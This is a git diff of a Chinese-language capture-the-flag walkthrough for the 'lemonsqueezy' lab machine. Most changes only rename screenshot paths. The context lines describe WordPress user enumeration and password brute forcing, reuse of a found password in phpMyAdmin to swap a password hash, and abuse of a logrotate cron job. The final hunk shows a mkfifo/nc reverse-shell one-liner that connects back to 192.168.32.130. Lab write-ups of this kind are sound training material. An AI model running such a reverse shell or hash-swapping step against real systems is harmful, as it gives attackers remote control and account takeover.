@@ -24,7 +24,7 @@ Nmap done: 1 IP address (1 host up) scanned in 9.60 seconds
 
 访问80端口
 
-![image-20220909233308825](../../.gitbook/assets/image-20220909233308825.png)
+![image-20220909233308825](../../.gitbook/assets/image-20220909233308825-1675839828076806.png)
 
 爆破web目录
 
@@ -62,7 +62,7 @@ GENERATED WORDS: 4612
 
 访问：`/wordpress/`
 
-![image-20220910103506222](../../.gitbook/assets/image-20220910103506222.png)
+![image-20220910103506222](../../.gitbook/assets/image-20220910103506222-1675839828077808.png)
 
 配置hosts
 
@@ -70,7 +70,7 @@ GENERATED WORDS: 4612
 192.168.32.218 lemonsqueezy
 ```
 
-![image-20220910103720426](../../.gitbook/assets/image-20220910103720426.png)
+![image-20220910103720426](../../.gitbook/assets/image-20220910103720426-1675839828077807.png)
 
 wpscan枚举用户
 
@@ -109,19 +109,19 @@ wpscan --url http://lemonsqueezy/wordpress --passwords /usr/share/wordlists/rock
 
 登录 wordpress 后，我们会看到一个草稿帖子，发现有密码：`n0t1n@w0rdl1st!`
 
-![image-20220910104223248](../../.gitbook/assets/image-20220910104223248.png)
+![image-20220910104223248](../../.gitbook/assets/image-20220910104223248-1675839828077809.png)
 
 然后我记得在目录扫描期间我们有"`phpmyadmin`"页面，我尝试使用`orange`用户的这个凭据登录到 `phpmyadmin`。
 
-![image-20220910104408097](../../.gitbook/assets/image-20220910104408097.png)
+![image-20220910104408097](../../.gitbook/assets/image-20220910104408097-1675839828077810.png)
 
 我们可以看到`orange`密码的哈希值，我试图破解它但没有成功。因此，我使用与用户`orange`相同的哈希对其进行了更改。
 
-![image-20220910104525995](../../.gitbook/assets/image-20220910104525995.png)
+![image-20220910104525995](../../.gitbook/assets/image-20220910104525995-1675839828077811.png)
 
 以`leon`用户的身份登录。
 
-![image-20220910104642540](../../.gitbook/assets/image-20220910104642540.png)
+![image-20220910104642540](../../.gitbook/assets/image-20220910104642540-1675839828077812.png)
 
 然后我尝试上传易受攻击的插件和外壳但无法成功，似乎我们无法在服务器上写入任何内容，因为它显示临时文件夹丢失。
 
@@ -164,7 +164,7 @@ www-data@lemonsqueezy:/var/www/html/wordpress/wp-content/uploads$ chmod +x LinEn
 
 发现一个计划任务
 
-![image-20220910110343135](../../.gitbook/assets/image-20220910110343135.png)
+![image-20220910110343135](../../.gitbook/assets/image-20220910110343135-1675839828077813.png)
 
 查看：`logrotate`
 
@@ -189,4 +189,4 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.32.130 9999 
 
 两分钟后，就可以看到建立连接。
 
-![image-20220910110729187](../../.gitbook/assets/image-20220910110729187.png)
+![image-20230208150353937](../../.gitbook/assets/image-20230208150353937.png)
